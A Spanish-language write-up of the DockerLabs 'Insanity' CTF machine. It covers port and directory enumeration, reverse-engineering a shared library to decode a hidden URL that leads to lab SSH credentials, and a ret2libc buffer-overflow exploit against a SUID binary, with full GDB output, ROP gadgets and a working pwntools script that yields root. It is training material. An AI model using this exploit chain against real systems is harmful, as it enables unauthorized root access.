---
icon: flag
---

# Insanity DockerLabs (Hard)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip insanity.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh insanity.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  
                                         
                                     
Desactivando el ASLR para poder resolver el laboratorio...

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 03:14 EST
Nmap scan report for 172.17.0.2
Host is up (0.000042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 d5:58:45:4b:77:e5:b7:ae:6f:bd:24:9c:6b:52:df:78 (ECDSA)
|_  256 0b:30:46:79:83:bd:6f:00:28:a0:98:32:d1:ef:9f:02 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://insanity.dl
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds
```

Vemos que cuando nos metemos en la pagina, nos redirige a un dominio llamado `insanity.dl` por lo que haremos lo siguiente.

```shell
nano /etc/hosts

#Dentro del nano
<IP>          insanity.dl
```

Lo guardamos y volvemos a cargar la pagina.

Si inspeccionamos la pagina, abajo del todo veremos lo siguiente en el codigo:

```html
<!-- Subdominio?? -->
<!-- Tal vez fuzzing??? -->
<!-- O capaz ninguno... -->
```

Vamos a probar a buscar alguna de estas cosas, por lo que realizaremos un poco de `fuzzing` con un diccionario grande, ya que con los medianos no encuentra nada:

## Gobuster

```shell
gobuster dir -u http://insanity.dl/ -w ../../Downloads/directory-list-2.3-big.txt -x html,php,txt -t 100 -k 
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://insanity.dl/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                ../../Downloads/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 10945]
/javascript           (Status: 301) [Size: 315] [--> http://insanity.dl/javascript/]
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 276]
/tinyp                (Status: 301) [Size: 310] [--> http://insanity.dl/tinyp/]
Progress: 5095328 / 5095332 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos un directorio interesante llamado `/tinyp` que si entramos en el veremos `2` archivos:

```
libcredenciales.so
secret
```

Por lo que nos lo descargaremos para ver mas en detalle que son.

Si ejecutamos el `secret` veremos lo siguiente:

```shell
./secret
```

Info:

```
Introduce la clave: 1234
Clave incorrecta.
```

Y si ejecutamos el otro veremos esto:

```shell
./libcredenciales.so
```

Info:

```
zsh: segmentation fault  ./libcredenciales.so
```

Vemos que el archivo `secret` depende del archivo `libcredenciales.so` por lo que tendremos que investigar el archivo `secret`.

Pero no conseguimos mucho, sin embargo si utilizamos `ghidra` para hacer `ingenieria inversa` al archivo `libcredenciales.so` veremos lo siguiente:

## Escalate user maci

### Ingenieria inversa

```shell
ghidra
```

Seleccionamos el archivo `libcredenciales.so` y veremos el codigo en `C`, por lo que nos vamos a ver que funciones tiene y vemos unas bastante interesantes llamadas `a,b y g`.

El código sugiere que la función `g()` utiliza `b()` y `a()` para transformar un conjunto de valores almacenados en variables como `local_4d8`, `local_4d4`, etc., en una cadena de caracteres que se utiliza como parte de una URL o nombre de archivo. Este flujo sugiere que puede haber una relación entre la transformación y un valor esperado.

#### Análisis del código:

1. **`a(int param_1)`**:
   * Este realiza una transformación condicional:
     * Si el valor está entre `1` y `0x1A`, suma `0x60`.
     * Si no, hay casos especiales para `0x1B`, `0x1C`, `0x1D`, y `0x1E`.
     * Valores que no encajan en ninguna de estas condiciones se convierten a `0x3F`.
2. **`b(long param_1, int param_2, long param_3)`**:
   * Llama a `a()` para cada valor en un arreglo de enteros, transformándolos en caracteres que almacena en el espacio apuntado por `param_3`.
3. **`g()`**:
   * Define un arreglo de valores (`local_4d8`, `local_4d4`, ..., `local_438`).
   * Usa `b()` para convertir estos valores en una cadena almacenada en `auStack_528`.
   * Construye una URL y ejecuta un comando `wget` para descargar un archivo.

Por lo que nos vamos a montar un script para poder decodificar eso y a ver a que `URL` nos manda esto:

> decodeLibcredenciales.py

```python
def a(param_1):
    if param_1 < 1 or param_1 > 0x1A:
        if param_1 == 0x1B:
            return 0x3A
        elif param_1 == 0x1C:
            return 0x2F
        elif param_1 == 0x1D:
            return 0x2E
        elif param_1 == 0x1E:
            return 0x5F
        else:
            return 0x3F
    else:
        return param_1 + 0x60

def b(values):
    result = ""
    for value in values:
        result += chr(a(value))
    return result

# Valores extraídos de g()
values = [
    8, 20, 20, 16, 27, 28, 28, 9, 14, 19, 1, 14, 9, 20, 25, 29, 4, 12, 28, 21,
    12, 20, 18, 1, 30, 19, 5, 3, 18, 5, 20, 30, 6, 15, 12, 4, 5, 18, 11, 13, 1
]

# Ejecutar b() sobre los valores
result = b(values)
print("Resultado:", result)
```

Lo ejecutamos de la siguiente forma:

```shell
python3 decodeLibcredenciales.py
```

Info:

```
Resultado: http://insanity.dl/ultra_secret_folderkma
```

Vemos que hay un directorio en la `web`, si entramos ahi veremos un `.txt` con una secuencia de numeros `2334645634646.txt` dentro de el veremos lo siguiente:

```
Credenciales de ssh

maci:CrACkEd
```

Vemos que hemos obtenido las credenciales del usuario `maci`, por lo que nos conectaremos a el.

### SSH

```shell
ssh maci@<IP>
```

Metemos como contraseña `CrACkEd` y veremos que estamos dentro.

## Escalate Privileges

Si listamos por los permisos `SUID` que tenemos:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
2135372     16 -r-sr-xr-x   1 root     root        16080 Jan 21 06:05 /opt/vuln
  2139252    640 -rwsr-xr-x   1 root     root       653888 Dec  8 00:14 /usr/lib/openssh/ssh-keysign
  2138585     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  2128040     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh
  2128164     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp
  2128175     68 -rwsr-xr-x   1 root     root          68248 Mar 23  2023 /usr/bin/passwd
  2135714     72 -rwsr-xr-x   1 root     root          72000 Nov 21 20:01 /usr/bin/su
  2128101     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd
  2135600     60 -rwsr-xr-x   1 root     root          59704 Nov 21 20:01 /usr/bin/mount
  2135754     36 -rwsr-xr-x   1 root     root          35128 Nov 21 20:01 /usr/bin/umount
  2128034     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn
  2135715    276 -rwsr-xr-x   1 root     root         281624 Jun 27  2023 /usr/bin/sudo
```

Vemos una interesante que esta en el `/opt` llamado `vuln`, si la intentamos ejecutar, veremos lo siguiente:

```shell
cd /opt
./vuln
```

Info:

```
Escribe tu nombre: maci
```

Y nos vemos nada mas, pero si probamos lo siguiente:

```shell
./vuln
```

Info:

```
Escribe tu nombre: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

Vemos que nos da un `Segmentation fault` por lo que podremos hacerle `Buffer Overflow`.

Si comprobamos si `gdb` esta instalado, vemos que si lo esta:

```shell
gdb -h
```

Por lo que podremos hacerlo directamente en la propia maquina victima.

### GDB

```shell
gdb -q ./vuln
```

Dentro del `gdb` con el binario cargado vamos a probar a realizar una explotación de `ret2libc`, lo que implica el uso de funciones de la biblioteca estándar de `C` (como `system`, `execve`, o `exit`) para ejecutar un código malicioso (en este caso, obtener una `shell`)

### Obtener el offset del binario

En nuestro `kali` nos tendremos que llevar el binario para saber el `offset` de forma mas sencillita, por lo que abriremos un server de `python3` en la maquina y nos lo pasaremos al `kali` con `wget` una vez que ya lo tengamos instalaremos la herramienta para el `gdb` llamada `pwndbg`, una vez echo todo esto, haremos lo siguiente:

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400 
```

Info:

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Dentro del `gdb` ejecutaremos `r` e insertaremos el patron que hemos creado anteriormente, por lo que veremos esto:

```
Starting program: /home/kali/Desktop/insanity/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Escribe tu nombre: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401189 in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
 RAX  0x7fffffffe060 ◂— 0x6141316141306141 ('Aa0Aa1Aa')
 RBX  0x7fffffffe208 —▸ 0x7fffffffe4f4 ◂— '/home/kali/Desktop/insanity/vuln'
 RCX  0x7ffff7f968e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RDX  0
 RDI  0x7ffff7f98720 (_IO_stdfile_0_lock) ◂— 0
 RSI  0x405800 ◂— 'Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A\n'
 R8   0x405841 ◂— 0
 R9   0
 R10  3
 R11  0x246
 R12  0
 R13  0x7fffffffe218 —▸ 0x7fffffffe515 ◂— 'COLORTERM=truecolor'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R15  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401130 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x4134654133654132 ('2Ae3Ae4A')
 RSP  0x7fffffffe0e8 ◂— 0x3765413665413565 ('e5Ae6Ae7')
 RIP  0x401189 (vuln+27) ◂— ret 
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────
 ► 0x401189 <vuln+27>    ret                                <0x3765413665413565>
    ↓









──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe0e8 ◂— 0x3765413665413565 ('e5Ae6Ae7')
01:0008│     0x7fffffffe0f0 ◂— 0x6641396541386541 ('Ae8Ae9Af')
02:0010│     0x7fffffffe0f8 ◂— 0x4132664131664130 ('0Af1Af2A')
03:0018│     0x7fffffffe100 ◂— 0x3566413466413366 ('f3Af4Af5')
04:0020│     0x7fffffffe108 ◂— 0x6641376641366641 ('Af6Af7Af')
05:0028│     0x7fffffffe110 ◂— 0x4130674139664138 ('8Af9Ag0A')
06:0030│     0x7fffffffe118 ◂— 0x3367413267413167 ('g1Ag2Ag3')
07:0038│     0x7fffffffe120 ◂— 0x6741356741346741 ('Ag4Ag5Ag')
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0         0x401189 vuln+27
   1 0x3765413665413565 None
   2 0x6641396541386541 None
   3 0x4132664131664130 None
   4 0x3566413466413366 None
   5 0x6641376641366641 None
   6 0x4130674139664138 None
   7 0x3367413267413167 None
───────────────────────────────────────────────────────────────────────────────────
```

Y dentificamos que la direccion de memoria es `0x3765413665413565` por lo que obtendremos su `offset` con la siguiente herramienta:

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x3765413665413565
```

Info:

```
[*] Exact match at offset 136
```

Veremos que es de `136`.

> Ahora de aqui para abajo sera todo dentro de la maquina victima, lo de antes solamente era en la maquina `host` para sacar el `offset`.

### Buscar la dirección de memoria `/bin/sh`

```shell
(gdb) find &__libc_start_main,+9999999,"/bin/sh"
```

Info:

```
0x7ffff7f73031
warning: Unable to access 16000 bytes of target memory at 0x7ffff7fbd3b9, halting search.
1 pattern found.
```

Por lo que veremos la encintramos que estaria en la `0x7ffff7f73031`, vamos a ver si es cierto de la siguiente forma:

```shell
(gdb) x/s 0x7ffff7f73031
```

Info:

```
0x7ffff7f73031: "/bin/sh"
```

Vemos que si, por lo que ya tendriamos la dirección de memoria del `sh`.

### Buscar la dirección de memoria `system`

```shell
(gdb) p system
```

Info:

```
$1 = {int (const char *)} 0x7ffff7e29490 <__libc_system>
```

Vemos que la dirección seria `0x7ffff7e29490`.

### Buscar la dirección de memoria `ret`

```shell
ROPgadget --binary ./vuln
```

Info:

```
Gadgets information
============================================================
0x0000000000401077 : add al, 0 ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401181 : add al, ch ; mov ecx, 0x90fffffe ; leave ; ret
0x00000000004010db : add bh, bh ; loopne 0x401145 ; nop ; ret
0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020
0x00000000004010a8 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x00000000004011da : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040114a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401039 : add byte ptr [rax], al ; jmp 0x401020
0x00000000004010aa : add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x00000000004011dc : add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x0000000000401044 : add byte ptr [rax], al ; push 1 ; jmp 0x401020
0x0000000000401054 : add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x0000000000401064 : add byte ptr [rax], al ; push 3 ; jmp 0x401020
0x0000000000401074 : add byte ptr [rax], al ; push 4 ; jmp 0x401020
0x0000000000401009 : add byte ptr [rax], al ; test rax, rax ; je 0x401012 ; call rax
0x000000000040114b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401149 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010da : add dil, dil ; loopne 0x401145 ; nop ; ret
0x0000000000401047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x401020
0x000000000040114c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401147 : add eax, 0x2ef3 ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401067 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401013 : add esp, 8 ; ret
0x0000000000401012 : add rsp, 8 ; ret
0x0000000000401186 : call qword ptr [rax + 0x4855c3c9]
0x0000000000401010 : call rax
0x0000000000401163 : cli ; jmp 0x4010f0
0x00000000004010d8 : cmp byte ptr [rax + 0x40], al ; add bh, bh ; loopne 0x401145 ; nop ; ret
0x0000000000401160 : endbr64 ; jmp 0x4010f0
0x0000000000401169 : in eax, 0x5f ; nop ; pop rbp ; ret
0x000000000040100e : je 0x401012 ; call rax
0x00000000004010d5 : je 0x4010e0 ; mov edi, 0x404038 ; jmp rax
0x0000000000401117 : je 0x401120 ; mov edi, 0x404038 ; jmp rax
0x000000000040103b : jmp 0x401020
0x0000000000401164 : jmp 0x4010f0
0x00000000004010dc : jmp rax
0x0000000000401188 : leave ; ret
0x00000000004010dd : loopne 0x401145 ; nop ; ret
0x0000000000401146 : mov byte ptr [rip + 0x2ef3], 1 ; pop rbp ; ret
0x0000000000401062 : mov dl, 0x2f ; add byte ptr [rax], al ; push 3 ; jmp 0x401020
0x0000000000401165 : mov dl, byte ptr [rbp + 0x48] ; mov ebp, esp ; pop rdi ; nop ; pop rbp ; ret
0x00000000004011d9 : mov eax, 0 ; pop rbp ; ret
0x0000000000401168 : mov ebp, esp ; pop rdi ; nop ; pop rbp ; ret
0x0000000000401183 : mov ecx, 0x90fffffe ; leave ; ret
0x00000000004010d7 : mov edi, 0x404038 ; jmp rax
0x0000000000401052 : mov edx, 0x6800002f ; add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401167 : mov rbp, rsp ; pop rdi ; nop ; pop rbp ; ret
0x0000000000401187 : nop ; leave ; ret
0x000000000040116b : nop ; pop rbp ; ret
0x00000000004010df : nop ; ret
0x000000000040115c : nop dword ptr [rax] ; endbr64 ; jmp 0x4010f0
0x00000000004010ac : nop dword ptr [rax] ; ret
0x00000000004010d6 : or dword ptr [rdi + 0x404038], edi ; jmp rax
0x000000000040114d : pop rbp ; ret
0x000000000040116a : pop rdi ; nop ; pop rbp ; ret
0x0000000000401036 : push 0 ; jmp 0x401020
0x0000000000401046 : push 1 ; jmp 0x401020
0x0000000000401056 : push 2 ; jmp 0x401020
0x0000000000401066 : push 3 ; jmp 0x401020
0x0000000000401076 : push 4 ; jmp 0x401020
0x0000000000401166 : push rbp ; mov rbp, rsp ; pop rdi ; nop ; pop rbp ; ret
0x0000000000401016 : ret
0x0000000000401042 : ret 0x2f
0x0000000000401022 : retf 0x2f
0x000000000040100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x00000000004011e1 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004011e0 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040100c : test eax, eax ; je 0x401012 ; call rax
0x00000000004010d3 : test eax, eax ; je 0x4010e0 ; mov edi, 0x404038 ; jmp rax
0x0000000000401115 : test eax, eax ; je 0x401120 ; mov edi, 0x404038 ; jmp rax
0x000000000040100b : test rax, rax ; je 0x401012 ; call rax

Unique gadgets found: 73
```

Vemos que la que nos interesa seria la siguiente linea:

```
0x0000000000401016 : ret
```

Por lo que seria la dirección `0x0000000000401016`.

### Buscar la dirección de memoria `pop_rdi_ret`

```shell
ROPgadget --binary ./vuln | grep "pop rdi"
```

Info:

```
0x0000000000401165 : mov dl, byte ptr [rbp + 0x48] ; mov ebp, esp ; pop rdi ; nop ; pop rbp ; ret
0x0000000000401168 : mov ebp, esp ; pop rdi ; nop ; pop rbp ; ret
0x0000000000401167 : mov rbp, rsp ; pop rdi ; nop ; pop rbp ; ret
0x000000000040116a : pop rdi ; nop ; pop rbp ; ret
0x0000000000401166 : push rbp ; mov rbp, rsp ; pop rdi ; nop ; pop rbp ; ret
```

Vemos que la que nos interesa seria `0x000000000040116a`.

Esto nos da la dirección del gadget que necesitamos. `pop rdi; ret` carga el valor de un argumento en el registro **rdi** (el primero para las funciones como `system()`) y luego hace un **ret** para volver a la siguiente instrucción, que normalmente será la ejecución de la función.

Podremos obtener mas informacion acerca de esta tecnica y de como funciona en la siguiente pagina en la que me ayudo bastante para poder realizarla.

URL = [Explotacion ret2libc Info](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)

> EXPLICACION DE TODO:

#### **¿Qué es la técnica de `ret2libc`?**

La técnica **ret2libc** es un ataque de **desbordamiento de buffer** utilizado para ejecutar funciones de la **librería estándar de C** (libc) sin necesidad de tener que escribir código malicioso como shellcode. En lugar de inyectar código directamente, el atacante redirige la ejecución del programa para llamar funciones ya presentes en la librería del sistema, como `system()`, que permite ejecutar comandos en el sistema operativo.

En un ataque **ret2libc**:

1. **Buffer overflow**: El atacante provoca un desbordamiento en un buffer, lo que sobrescribe el **registro de retorno** (el **RIP** o **EIP** en arquitecturas modernas) y lo redirige a una **función de libc**, por ejemplo, `system()`.
2. **Gadget de ROP**: Utiliza gadgets que permiten controlar los registros necesarios para invocar funciones en la libc de manera adecuada, como cargar los parámetros requeridos por la función `system()` (como la dirección de `"/bin/sh"`).
3. **Ejecutar comandos**: Esto permite al atacante ejecutar comandos del sistema, como abrir una shell con `system("/bin/sh")`.

**Identificación de gadgets útiles**:

* Para realizar un ataque **ret2libc**, necesitamos **gadgets** que nos ayuden a preparar los registros para llamar a la función que queremos. En este caso, el **gadget** necesario es `pop rdi; ret`, que nos permite poner un argumento en el registro **rdi** (el primer argumento de una función en la convención de llamada **x86\_64**).
* Usamos **ROPgadget** para encontrar estos gadgets. En el caso de nuestro binario, el gadget `pop rdi; ret` lo encontramos en la dirección `0x40116a`.

**Encontrar direcciones en la libc**:

* Para poder llamar a `system()`, necesitamos la dirección de esa función dentro de la memoria. Esta dirección está contenida dentro de la **librería libc** (una librería estándar que es utilizada por muchos programas).
* Una forma de encontrar esta dirección es **buscar en memoria** por la cadena `"/bin/sh"`, que es el argumento que pasa a la función `system()` para ejecutar un shell. En este caso, la dirección encontrada fue `0x7ffff7f73031`.

**Obtener la dirección de `system()`**:

* Para realizar el ataque, necesitamos la dirección de la función `system()`, que es la que ejecutará el comando `/bin/sh` en el sistema. Usamos `pwn` para obtener esta dirección desde la librería **libc**.

Sabiendo toda esta informacion vamos a montarnos un `script` en `python3`:

```python
from pwn import *

# Cargar el binario
binary = ELF('/opt/vuln')
p = process('/opt/vuln')

# Direcciones relevantes
pop_rdi_ret = 0x40116a          # Dirección del gadget `pop rdi ; ret`
ret = 0x401016                  # Gadget `ret` para alineación (opcional)
bin_sh = 0x7ffff7f73031         # Nueva dirección de "/bin/sh"
system = 0x7ffff7e29490         # Dirección de `system`

# Construcción del payload
offset = 136                    # Offset para sobrescribir el RIP
payload = b"A" * offset         # Relleno
payload += p64(pop_rdi_ret)     # Gadget `pop rdi ; ret`
payload += p64(bin_sh)          # Dirección de "/bin/sh"
payload += p64(ret)             # Gadget `ret` para alineación (opcional)
payload += p64(system)          # Dirección de `system`

# Enviar el payload
p.sendline(payload)
p.interactive()
```

#### **Explicación del payload**:

* **Relleno (`A` \* offset)**: Se coloca un relleno para sobrescribir el **registro de retorno** (RIP) en la pila. El offset de `136` es obtenido a través de pruebas previas (por ejemplo, con `gdb`).
* **Gadget `pop rdi ; ret`**: Usamos este gadget para colocar la dirección de `"/bin/sh"` en el registro **rdi**, que es el primer argumento para `system()`.
* **Dirección de `"/bin/sh"`**: La dirección de la cadena `"/bin/sh"` se obtiene de la memoria.
* **Gadget `ret`**: A veces es necesario un gadget adicional como `ret` para garantizar que la pila esté bien alineada antes de llamar a la función.
* **Dirección de `system()`**: Finalmente, usamos la dirección de la función `system()` para ejecutar el comando `"/bin/sh"`, que debería abrir una shell.

Ahora lo ejecutaremos de la siguiente forma:

```shell
python3 exploit.py
```

Info:

```
[*] '/opt/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/opt/vuln': pid 152
[*] Switching to interactive mode
Escribe tu nombre: $ id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(maci)
$ whoami
root
```

Y como vemos con esto ya seremos `root`, por lo que habremos terminado la maquina.
